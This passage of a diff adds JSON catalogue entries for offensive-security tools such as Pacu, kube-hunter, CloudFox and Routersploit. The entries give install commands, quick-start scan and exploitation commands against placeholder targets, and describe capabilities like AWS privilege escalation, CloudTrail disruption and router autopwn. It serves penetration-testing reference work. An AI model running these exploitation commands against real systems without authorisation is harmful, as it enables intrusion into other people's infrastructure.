+      "git": "git clone https://github.com/BishopFox/cloudfox.git && cd cloudfox && go build"
+    },
+    "repo_url": "https://github.com/BishopFox/cloudfox",
+    "repo_type": "github",
+    "official_url": "https://github.com/BishopFox/cloudfox",
+    "research_links": [
+      {
+        "title": "BishopFox - Introducing CloudFox",
+        "url": "https://bishopfox.com/blog/cloudfox-aws-pentesting"
+      },
+      {
+        "title": "HackTricks - AWS Pentesting Methodology",
+        "url": "https://book.hacktricks.xyz/cloud-security/aws-security"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Audit All AWS Attack Vectors",
+        "cmd": "cloudfox aws --profile target-profile all-checks"
+      },
+      {
+        "label": "Find S3 Buckets & Permissions",
+        "cmd": "cloudfox aws --profile target-profile buckets"
+      }
+    ],
+    "notes": "Created by BishopFox specifically to avoid information overload during cloud pentests by pinpointing exploitable paths directly."
+  },
+  {
+    "id": "kube-hunter",
+    "name": "Kube-hunter",
+    "tagline": "Hunt for security weaknesses and misconfigurations in Kubernetes clusters",
+    "category": "Cloud & Container Security",
+    "rarity": "popular",
+    "purpose_summary": "Actively probe Kubernetes clusters for exposed API servers, kubelet read-only ports, etcd open access, SSRF to cloud metadata, and container breakout points.",
+    "purposes": [
+      "kubernetes security audit",
+      "kubelet vulnerability scan",
+      "etcd unauthenticated access",
+      "k8s cluster attack path",
+      "container orchestration audit"
+    ],
+    "distros": {
+      "blackarch": "pacman -S kube-hunter",
+      "arch": "yay -S kube-hunter",
+      "debian": "pipx install kube-hunter || pip install kube-hunter",
+      "git": "git clone https://github.com/aquasecurity/kube-hunter.git && cd kube-hunter && pip install -r requirements.txt"
+    },
+    "repo_url": "https://github.com/aquasecurity/kube-hunter",
+    "repo_type": "github",
+    "official_url": "https://kube-hunter.aquasec.com/",
+    "research_links": [
+      {
+        "title": "HackTricks - Kubernetes Pentesting",
+        "url": "https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes"
+      },
+      {
+        "title": "Aqua Security - Kube-Hunter Docs",
+        "url": "https://github.com/aquasecurity/kube-hunter"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Remote Scan IP / CIDR",
+        "cmd": "kube-hunter --remote 10.0.0.1/24"
+      },
+      {
+        "label": "Run Active Exploitation Checks",
+        "cmd": "kube-hunter --active --remote 10.0.0.100"
+      }
+    ],
+    "notes": "Supports passive, active, and internal pod-based scanning modes."
+  },
+  {
+    "id": "pacu",
+    "name": "Pacu",
+    "tagline": "The AWS exploitation framework for red teams",
+    "category": "Cloud & Container Security",
+    "rarity": "popular",
+    "purpose_summary": "Perform post-compromise AWS exploitation with modules for privilege escalation, IAM persistence, CloudTrail disruption, and Lambda data exfiltration.",
+    "purposes": [
+      "aws red team framework",
+      "cloudtrail evasion disruption",
+      "iam privilege escalation aws",
+      "s3 exfiltration framework"
+    ],
+    "distros": {
+      "blackarch": "pacman -S pacu",
+      "arch": "yay -S pacu",
+      "debian": "pipx install pacu || pip install pacu",
+      "git": "git clone https://github.com/RhinoSecurityLabs/pacu.git && cd pacu && pip3 install -r requirements.txt"
+    },
+    "repo_url": "https://github.com/RhinoSecurityLabs/pacu",
+    "repo_type": "github",
+    "official_url": "https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/",
+    "research_links": [
+      {
+        "title": "HackTricks - AWS Post-Exploitation with Pacu",
+        "url": "https://book.hacktricks.xyz/cloud-security/aws-security"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Start Pacu Console",
+        "cmd": "pacu"
+      },
+      {
+        "label": "Run IAM Privesc Scanner Inside Pacu",
+        "cmd": "Pacu> run iam__privesc_scan"
+      }
+    ],
+    "notes": "The Metasploit of AWS cloud penetration testing."
+  },
+  {
+    "id": "binwalk",
+    "name": "Binwalk",
+    "tagline": "Firmware analysis, extraction, and reverse engineering engine",
+    "category": "Firmware & IoT Reverse Engineering",
+    "rarity": "popular",
+    "purpose_summary": "Analyze embedded firmware binary images, identify file systems (SquashFS, CramFS, JFFS2), extract compressed files, and uncover hidden crypto keys.",
+    "purposes": [
+      "extract router firmware",
+      "squashfs extraction",
+      "iot reverse engineering",
+      "binary file carver",
+      "extract hidden rootfs"
+    ],
+    "distros": {
+      "blackarch": "pacman -S binwalk",
+      "arch": "pacman -S binwalk || yay -S binwalk",
+      "debian": "sudo apt install binwalk -y",
+      "git": "git clone https://github.com/ReFirmLabs/binwalk.git && cd binwalk && sudo python3 setup.py install"
+    },
+    "repo_url": "https://github.com/ReFirmLabs/binwalk",
+    "repo_type": "github",
+    "official_url": "https://github.com/ReFirmLabs/binwalk",
+    "research_links": [
+      {
+        "title": "HackTricks - Firmware Analysis & Binwalk",
+        "url": "https://book.hacktricks.xyz/hardware-physical-attacks/firmware-analysis"
+      },
+      {
+        "title": "Medium - Extracting IoT Secrets with Binwalk",
+        "url": "https://medium.com/@iotsec/binwalk-firmware-extraction-guide"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Scan Firmware Headers & Compression",
+        "cmd": "binwalk firmware.bin"
+      },
+      {
+        "label": "Recursively Extract All File Systems",
+        "cmd": "binwalk -Me firmware.bin"
+      }
+    ],
+    "notes": "Essential first step in any IoT, router, IP camera, or automotive embedded pentest."
+  },
+  {
+    "id": "emba",
+    "name": "EMBA",
+    "tagline": "The security analyzer for embedded Linux firmware",
+    "category": "Firmware & IoT Reverse Engineering",
+    "rarity": "rare",
+    "purpose_summary": "Completely automated security testing suite for embedded device firmware; extracts, identifies hardcoded credentials, outdated software, CVEs, and binaries with weak protections.",
+    "purposes": [
+      "automated firmware security analysis",
+      "find hardcoded passwords in firmware",
+      "embedded linux vulnerability audit",
+      "iot cve scanner",
+      "sast for router firmware"
+    ],
+    "distros": {
+      "blackarch": "pacman -S emba",
+      "arch": "yay -S emba-git",
+      "debian": "git clone https://github.com/e-m-b-a/emba.git && cd emba && sudo ./installer.sh -d",
+      "git": "git clone https://github.com/e-m-b-a/emba.git && cd emba && sudo ./installer.sh -F"
+    },
+    "repo_url": "https://github.com/e-m-b-a/emba",
+    "repo_type": "github",
+    "official_url": "https://github.com/e-m-b-a/emba",
+    "research_links": [
+      {
+        "title": "EMBA Official Documentation & Wiki",
+        "url": "https://github.com/e-m-b-a/emba/wiki"
+      },
+      {
+        "title": "Medium - Automated Firmware Pentesting with EMBA",
+        "url": "https://medium.com/@embeddedsec/emba-firmware-auditing"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Full Automated Firmware Audit",
+        "cmd": "sudo ./emba -f /path/to/firmware.bin -l /tmp/emba_logs/ -p ./scan-profiles/default-scan.emba"
+      }
+    ],
+    "notes": "Rare and exceptionally deep firmware auditing suite with an HTML reporting dashboard output."
+  },
+  {
+    "id": "routersploit",
+    "name": "Routersploit",
+    "tagline": "The automated exploitation framework for embedded devices and routers",
+    "category": "Firmware & IoT Reverse Engineering",
+    "rarity": "popular",
+    "purpose_summary": "Exploit embedded routers, IP webcams, and smart IoT devices using a modular Metasploit-like framework with automated vulnerability scanner modules.",
+    "purposes": [
+      "router exploitation framework",
+      "iot vulnerability scanner",
+      "default credentials router scanner",
+      "embedded device rce"
+    ],
+    "distros": {
+      "blackarch": "pacman -S routersploit",
+      "arch": "yay -S routersploit",
+      "debian": "sudo apt install routersploit -y || git clone https://github.com/threat9/routersploit && cd routersploit && pip3 install -r requirements.txt",
+      "git": "git clone https://github.com/threat9/routersploit.git && cd routersploit && pip3 install -r requirements.txt"
+    },
+    "repo_url": "https://github.com/threat9/routersploit",
+    "repo_type": "github",
+    "official_url": "https://www.threat9.com/routersploit",
+    "research_links": [
+      {
+        "title": "HackTricks - Embedded Devices & Routersploit",
+        "url": "https://book.hacktricks.xyz/hardware-physical-attacks/firmware-analysis"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Run AutoPwn Scanner on Target IP",
+        "cmd": "rsf.py\nuse scanners/autopwn\nset target 192.168.1.1\nrun"
+      }
+    ],
+    "notes": "Includes hundreds of exploits for Netgear, Cisco, D-Link, Huawei, TP-Link, and Linksys devices."
+  }
+]
